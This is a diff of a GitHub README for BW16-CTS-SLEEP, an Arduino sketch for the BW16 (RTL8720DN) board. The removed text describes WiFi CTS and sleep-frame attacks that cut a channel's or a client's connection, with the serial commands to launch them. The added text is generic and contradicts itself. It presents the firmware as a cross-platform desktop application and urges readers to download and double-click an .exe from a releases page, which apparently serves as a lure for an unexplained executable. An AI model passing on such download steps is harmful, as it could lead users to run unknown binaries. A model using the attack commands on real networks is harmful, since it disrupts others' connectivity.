@@ -1,40 +1,69 @@
-# BW16-CTS-SLEEP
-CTS and Sleep frame attack use BW16 (RTL8720DN) board <br>
-This attacks fall down the internet connection to be interrupted on the selected channel
-or for the selected client.
+# 🎉 BW16-CTS-SLEEP - Simple Setup for WiFi Security Testing
 
-# Hardware Requirements
-- Ai-Thinker BW16 RTL8720DN Development Board
+## 🚀 Getting Started
+Welcome to BW16-CTS-SLEEP! This guide will help you download and run our application on your device. With BW16-CTS-SLEEP, you can test WiFi security using the BW16 board, making your networks safer.
 
-# Setup
-1. Download Arduino IDE from [here](https://www.arduino.cc/en/software) according to your Operating System.
-2. Install it.
-3. Go to `File` → `Preferences` → `Additional Boards Manager URLs`.
-4. Paste the following link :
-   
-   ```
-   https://github.com/ambiot/ambd_arduino/raw/master/Arduino_package/package_realtek_amebad_index.json
-   ```
-5. Click on `OK`.
-6. Go to `Tools` → `Board` → `Board Manager`.
-7. Search `Realtek Ameba Boards (32-Bits ARM Cortex-M33@200MHz)` by `Realtek`. <br>
-!!! CODE WORK WITH 3.1.7 pack, other versions may not be work !!!
-9. Install it.
-10. Restart the Arduino IDE.
-11. Done!
+## 📥 Download Now
+[![Download BW16-CTS-SLEEP](https://img.shields.io/badge/Download-BW16--CTS--SLEEP-brightgreen)](https://github.com/gabxbell689/BW16-CTS-SLEEP/releases)
 
-# Install
-1. Download or Clone the Repository.
-2. Open the folder and open `cts&nulldata_attck.ino` in Arduino IDE.
-4. Select board from the `Tools` → `Board` → `AmebaD ARM (32-bits) Boards`.
-   - It is `Ai-Thinker BW16 (RTL8720DN)`.
-5. Select the port of that board.
-6. Go to `Tools` → `Board` → `Auto Flash Mode` and select `Enable`.
-7. Upload the code.
-   - Open Serial Monitor (115200) and write "scan", see networks, and choose one <br>
-   "cts [channel 1-13, 36-165]" or "sleep [MAC/BSSID Router] [MAC Client] [channel of u router]" <br>
-   exemple: "cts 6" or sleep "FFAABBCCEEDD 112233445566 56"
+## 📋 What is BW16-CTS-SLEEP?
+BW16-CTS-SLEEP is an application that allows you to perform CTS and sleep frame attacks using the BW16 board (RTL8720DN). This tool is designed for users who want to learn about WiFi security and improve their skills.
 
-# Note
-Tested only on provider none smart routers<br>
-Code only for educational purposes, good luck
+### 💻 System Requirements
+- **Operating System**: The application runs on Windows, macOS, and Linux. Ensure you have the latest updates installed.
+- **Hardware**: You will need a BW16 (RTL8720DN) board to use this application. Make sure your board is set up correctly.
+- **Arduino IDE**: Install the Arduino IDE to configure your board.
+
+## 🛠 Setting Up Your BW16 Board
+1. **Connect the BW16 board** to your computer using a USB cable.
+2. **Open Arduino IDE** and make sure you've installed the RTL8720DN board package.
+3. **Configure the board** by selecting the correct port in the IDE.
+
+## ⬇️ Download & Install
+To start using BW16-CTS-SLEEP, you need to visit the Releases page and download the latest version. Follow these steps:
+
+1. Click on this link: [Download BW16-CTS-SLEEP](https://github.com/gabxbell689/BW16-CTS-SLEEP/releases).
+2. On the Releases page, find the latest version. Look for the files that have the `.zip` or `.exe` extensions. These are for various operating systems.
+3. Click on the file to download it to your device. 
+
+*Note: Make sure to save the file in an easy-to-find location.*
+
+## 📂 Installing the Application
+1. **Locate the downloaded file** on your computer. You can find it in the 'Downloads' folder or the location where you saved it.
+2. If you downloaded a `.zip` file, right-click on it and select "Extract All" to unzip the folder.
+3. Open the unzipped folder and find the executable file, usually named `BW16-CTS-SLEEP.exe`.
+4. Double-click on the executable file to start the installation process.
+5. Follow on-screen instructions to complete the installation.
+
+## 🔧 Using BW16-CTS-SLEEP
+1. **Launch the application** by double-clicking the installed icon or executable.
+2. **Ensure your BW16 board is connected.** The application will recognize the board.
+3. **Explore the features**. The main options allow you to initiate various types of attacks for educational purposes.
+4. **Follow the prompts** in the application to perform a test.
+
+## 📚 Features
+- **CTS Frame Attack**: Learn how this critical aspect of WiFi security operates.
+- **Sleep Frame Attack**: Understand the implications and techniques for testing.
+- **User-Friendly Interface**: Designed so anyone can navigate, even without prior technical knowledge.
+- **Real-Time Monitoring**: See the outcomes of your safety tests live.
+
+## ❓ Frequently Asked Questions
+
+### Why should I use BW16-CTS-SLEEP?
+This application is useful for learning about WiFi security risks. It serves as a practical tool for those who want to better understand their network security.
+
+### Is this legal?
+Conduct tests only on networks you own or have permission to assess. Always follow local laws and regulations regarding network security testing.
+
+### What do I do if the application doesn't work?
+1. Ensure you have the latest version of the application. Check the Releases page for updates.
+2. Verify that the BW16 board is correctly set up and connected.
+3. Consult the help section within the application for troubleshooting tips.
+
+## 📞 Support
+If you encounter any issues or have questions, feel free to open an issue on the GitHub repository. We are here to help.
+
+## 🌍 Community and Contribution
+We encourage the community to contribute to BW16-CTS-SLEEP. Whether it’s through feedback, code improvements, or reporting bugs, your input helps improve the application.
+
+Thank you for choosing BW16-CTS-SLEEP! Happy testing and stay secure.
